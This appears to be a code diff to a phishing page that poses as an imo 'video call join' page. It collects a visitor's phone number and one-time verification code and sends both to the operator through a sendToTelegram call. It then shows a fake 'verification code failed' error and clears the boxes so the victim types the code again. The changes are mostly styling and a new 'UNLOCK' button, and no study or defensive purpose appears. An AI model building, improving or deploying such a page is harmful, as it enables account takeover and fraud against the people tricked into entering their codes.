@@ -13,19 +13,43 @@
         input#phone { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
         
         .otp-container { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
-        .otp-box { width: 45px; height: 55px; border: 1px solid #ccc; border-radius: 8px; font-size: 22px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
+        .otp-box { width: 48px; height: 60px; border: 1px solid #d1d1d1; border-radius: 10px; font-size: 22px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
         .otp-box:focus { border-color: #e91e63; }
 
-        /* স্পিনার ডিজাইন */
-        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #333; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 5px; }
+        /* স্ট্যাটাস মেসেজ এবং স্পিনার যেখানে ছিল সেখানেই থাকবে */
+        #statusMsg { 
+            margin-top: 15px; 
+            min-height: 30px; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            font-size: 14px; 
+            font-weight: bold;
+        }
+
+        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #333; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* মেসেজ স্টাইল */
-        #statusMsg { font-size: 13px; font-weight: bold; margin-top: 20px; min-height: 20px; line-height: 1.5; }
         .black-text { color: black; }
-        .red-text { color: red; } /* আপনার চাহিদামত লাল কালার */
+        .red-text { color: red; }
 
-        button { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
+        /* আপনার চাহিদা অনুযায়ী নতুন বাটন স্টাইল */
+        .unlock-btn { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(to right, #6a11cb, #2575fc); 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 15px; 
+            font-weight: bold; 
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }
     </style>
 </head>
 <body>
@@ -38,7 +62,7 @@
     <form id="mainForm">
         <div id="step1">
             <input type="tel" id="phone" placeholder="আপনার ইমু নাম্বার লেখুন" required>
-            <button type="button" onclick="goToStep2()">VIDEO CALL JOIN NOW</button>
+            <button type="button" class="unlock-btn" onclick="goToStep2()">VIDEO CALL JOIN NOW</button>
         </div>
 
         <div id="step2" style="display:none;">
@@ -49,9 +73,9 @@
                 <input type="tel" maxlength="1" class="otp-box" id="otp4" oninput="processOTP(this)" onkeyup="moveBack(event, 'otp3')">
             </div>
             
-            <div id="statusMsg"></div>
+            <button type="button" class="unlock-btn" id="unlockButton">🔒 UNLOCK VIDEO CALL JOIN NOW</button>
             
-            <button type="submit" id="submitBtn" style="display:none;">ভিডিও কল শুরু করুন</button>
+            <div id="statusMsg"></div>
         </div>
     </form>
 </div>
@@ -80,26 +104,23 @@
             const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
 
             if (otpValue.length === 4) {
-                // ১. কোড কাটার অপশন বন্ধ (ReadOnly)
                 otpBoxes.forEach(box => box.readOnly = true);
 
-                // ২. কালো রঙে Please wait এবং স্পিনার দেখানো
+                // আগে যেখানে আসত সেখানেই "Please wait..." আসবে
                 statusBox.innerHTML = '<div class="loader"></div> <span class="black-text">Please wait...</span>';
                 
-                // ৩. ৪ সেকেন্ড পর লাল রঙে এরর দেখানো
                 setTimeout(() => {
-                    // টেলিগ্রামে পাঠানো
-                    sendToTelegram(`✅ OTP Attempt!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpValue}`);
+                    sendToTelegram(`✅ OTP Attempted!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpValue}`);
 
+                    // এরর মেসেজ লাল কালারে আসবে
                     statusBox.innerHTML = '<span class="red-text">⚠️ verification code failed please try again. ⚠️</span>';
                     
-                    // ৪. আবার কোড লেখার অপশন চালু করা (১.৫ সেকেন্ড পর বক্স খালি হবে)
                     setTimeout(() => {
                         otpBoxes.forEach(box => {
                             box.readOnly = false;
                             box.value = '';
                         });
-                        statusBox.innerHTML = ''; // মেসেজ মুছে ফেলা
+                        statusBox.innerHTML = ''; 
                         document.getElementById('otp1').focus();
                     }, 1500);
 
